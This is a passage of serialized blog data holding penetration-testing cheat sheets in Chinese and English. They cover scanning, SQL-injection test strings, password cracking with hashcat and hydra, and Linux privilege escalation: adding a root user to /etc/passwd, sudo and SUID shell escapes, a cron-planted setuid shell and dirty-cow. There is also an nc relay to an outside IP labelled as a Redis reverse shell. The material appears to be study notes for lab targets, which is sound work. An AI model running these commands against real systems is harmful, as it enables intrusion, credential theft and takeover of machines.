class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nikto -port {web ports} -host &amp;#x3C;ip address&gt; -o &amp;#x3C;output file.txt&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 目录扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Dirb http{s}://&amp;#x3C;ip address&gt;:&amp;#x3C;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Gobuster -u http://&amp;#x3C;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#如果想测试文件包含漏洞，可以使用 fimap：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;fimap -u &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;针对已知的服务进行攻击尝试，搜索漏洞信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;漏洞来源：\n&lt;a href=\&quot;https://www.securityfocus.com/vulnerabilities\&quot;&gt;https://www.securityfocus.com/vulnerabilities&lt;/a&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-页面的测试\&quot;&gt;针对 web 页面的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-页面的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● NULL 或 null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, \&quot;, ;, &amp;#x3C;!&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● -, =, +, \&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于手工 SQL 注入测试&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, &amp;#x26;, ! , ¦ , &amp;#x3C; , &gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于找出命令执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● ../&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 目录穿越漏洞&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-netbiossmbrpc-端口的测试\&quot;&gt;针对 NETBIOS、SMB、RPC 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-netbiossmbrpc-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux -a &amp;#x3C;ip address&gt; Rpcclient &amp;#x3C;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &amp;#x3C;target ip&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;关于 RPC 历史漏洞的合集：\n&lt;a href=\&quot;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\&quot;&gt;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/&lt;/a&gt;\n以下是常用的远程测试命令&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Showmount -e &amp;#x3C;ip address&gt;/&amp;#x3C;port&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Mount -t cifs //&amp;#x3C;server ip&gt;/&amp;#x3C;share&gt; &amp;#x3C;local dir&gt; -o username=”guest”,password=”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Rlogin &amp;#x3C;ip-address&gt; Smbclient -L &amp;#x3C;ip-address&gt; -U “” -N Nbtscan -r &amp;#x3C;ip address&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net use &amp;#x3C;ip-address&gt;$Share “” /u:”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net view &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-smtp-端口的尝试\&quot;&gt;针对 SMTP 端口的尝试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-smtp-端口的尝试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;枚举用户，使用 VRFY 和 EXPN 命令&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-snmp-端口的测试\&quot;&gt;针对 SNMP 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-snmp-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;默认共享名称如：public, private, cisco, manager\n使用工具：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Onesixtyone –c &amp;#x3C;community list file&gt; -I &amp;#x3C;ip-address&gt; Snmpwalk -c &amp;#x3C;community string&gt; -v&amp;#x3C;version&gt; &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 默认 MIB：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 比如枚举运行的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-ftp-端口测试\&quot;&gt;针对 FTP 端口测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-ftp-端口测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● anonymous 是否可以登录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 如果可以登录是否可以使用 get 或 send 操作文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 使用浏览器是否可以访问，ftp://&amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;密码破解\&quot;&gt;密码破解&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#密码破解\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow [passwd-file] [shadow-file] &gt; unshadowed.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hashcat -m 400 -a 0 &amp;#x3C;hash file&gt; &amp;#x3C;wordlist file&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 对于其他服务，可以使用 Medusa 或 hydra&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hydra -L &amp;#x3C;username file&gt; -P &amp;#x3C;Password file&gt; -v &amp;#x3C;ip-address&gt; ssh &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Medusa -h &amp;#x3C;ip-address&gt; -U &amp;#x3C;username file&gt; -P &amp;#x3C;password file&gt; -M http -m DIR:/admin -T 30&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;数据包抓取\&quot;&gt;数据包抓取&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#数据包抓取\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;使用 wireshark / tcpdump 获取目标主机的流量&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;tcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;参考资料\&quot;&gt;参考资料&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#参考资料\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;NMAP Cheatsheet\n&lt;a href=\&quot;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf\&quot;&gt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&lt;/a&gt;\nExploit-DB\n&lt;a href=\&quot;https://www.exploit-db.com/\&quot;&gt;https://www.exploit-db.com/&lt;/a&gt;\nKernel Exploits\n&lt;a href=\&quot;https://www.kernel-exploits.com/\&quot;&gt;https://www.kernel-exploits.com/&lt;/a&gt;\nPrivilege Escalation Linux\n&lt;a href=\&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;\n&amp;#x3C;Linux Pentest Commands\n&lt;a href=\&quot;http://www.networkpentest.net/p/linuxunix-command-list.html\&quot;&gt;http://www.networkpentest.net/p/linuxunix-command-list.html&lt;/a&gt;\nWindows Command Line Cheatsheet\n&lt;a href=\&quot;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf\&quot;&gt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&lt;/a&gt;\nPrivilege Escalation Windows:\n&lt;a href=\&quot;http://www.fuzzysecurity.com/tutorials/16.html\&quot;&gt;http://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;\n&lt;a href=\&quot;http://toshellandback.com/2015/11/24/ms-priv-esc/\&quot;&gt;http://toshellandback.com/2015/11/24/ms-priv-esc/&lt;/a&gt;\nWindows Priv Esc cheatsheet\n&lt;a href=\&quot;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html\&quot;&gt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&lt;/a&gt;\nPentest References:\n&lt;a href=\&quot;http://www.vulnerabilityassessment.co.uk/\&quot;&gt;http://www.vulnerabilityassessment.co.uk/&lt;/a&gt;\n&lt;a href=\&quot;http://www.0daysecurity.com/penetration-testing/enumeration.html\&quot;&gt;http://www.0daysecurity.com/penetration-testing/enumeration.html&lt;/a&gt;\nReverse Shell:\n&lt;a href=\&quot;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/\&quot;&gt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&lt;/a&gt;\n&lt;a href=\&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;\n&lt;a href=\&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html\&quot;&gt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&lt;/a&gt;\n&lt;a href=\&quot;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/\&quot;&gt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&lt;/a&gt;\nShell Escape:\n&lt;a href=\&quot;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells\&quot;&gt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&lt;/a&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;a href=\&quot;http://pentestmonkey.net/category/cheat-sheet\&quot;&gt;http://pentestmonkey.net/category/cheat-sheet&lt;/a&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2026-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/11&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/mandatory-manual&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n## Port scan\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-\n```\n\n\n## Web scan\n```\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\nnikto  -port 80 -host 192.168.124.44 -o nikto-result.txt\n```\n***\n# Vulnerability analysis\nUse nc to view banner.\n```\nnc -nv 192.168.124.44 22\n```\n```\nsearchsploit &lt;service name&gt;\nsearchsploit -m 47080\n```\n\n\n***\n# Exploitation\n\n## smb\n```\nenum4linux 192.168.124.40\nsmbclient -L 192.168.124.40\n```\n\n\n***\n# Privilege escalation\n## Linux \n### Kernel stack overflow\n```\nuname -a\ncat /etc/*-release\nsearchsploit linux 3.10 CentOS Linux 7\n```\nuse tools\n```\n./linux-exploit-suggester-2.pl\n```\nTake the rights of dirty-cow as an example\n```\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n```\n### Plain password of root\nIf /etc/passwd can be write by common user.\n```\nopenssl passwd -1 -salt hacker 123456\n```\ngenerate `$1$hacker$4o50Z4aoUGaLMC0Rg4Io40`\n```\necho &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd\n```\nThen login in user hacker\n\nIf /etc/shadow can be read by common user.\n```\nunshadow /etc/passwd /etc/shadow &gt; shadow.txt\nchmod 777 shadow.txt\njohn --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt\n```\n### Password reuse\n### Sudo abuse\n`sudo -l`\n&gt;https://gtfobins.github.io/\n\nFor example:`su,    awk,    man `\n```\nsudo su\n```\n```\nsudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;\n```\n```\nsudo man man\n!/bin/sh\n```\n```\nsudo vim -c &#39;:!/bin/sh&#39;\n```\n### &#39;su root&#39; prohibited\n```\npython -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)\nsudo su\n```\n### Scheduled task\n```\nls -l /etc/cron*\ncat /etc/crontab\n```\nIf there is a scheduled task named 1.py\n```\nls -al /tmp/1.py    //查看是否有w权限\n```\nWrite the code into 1.py\n```\nimport os \nos.system(&#39;cp /bin/sh /tmp/sh&#39;) \nos.system(&#39;chmod u+s /tmp/sh&#39;)\n```\n`./tmp/sh`\n### SUID\nTake nmap as an example:\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n### Environment variable hijacking\nFind command with suid just as 4.1.7.\nSuppose it is `su`\n```\nvim /tmp/su         //write shellcode into su\nexport PATH=/tmp:$PATH\n```\n### Administrator configuration error\nConfiguring a program with SUID that does not have the setuid(0) code, such as `find `mentioned above.\n```\nmkdir abc\nfind abc -exec &#39;/bin/sh&#39; \\;\n```\n### Docker group\n### Service vulnerability\n```\nnetstat -antup\n```\nRedis reverse shell.\n```\nnc -l 12345 | nc 102.168.191.170 80\n```\n## Windows\n***\n# 5 Domain penetration&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Mandatory manual.md&quot;],&quot;digest&quot;:[0,&quot;9a10681b2f297e3d&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;port-scan\&quot;&gt;Port scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#port-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;web-scan\&quot;&gt;Web scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#web-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;vulnerability-analysis\&quot;&gt;Vulnerability analysis&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#vulnerability-analysis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use nc to view banner.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv 192.168.124.44 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -m 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;exploitation\&quot;&gt;Exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;smb\&quot;&gt;smb&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#smb\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux 192.168.124.40&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbclient -L 192.168.124.40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon 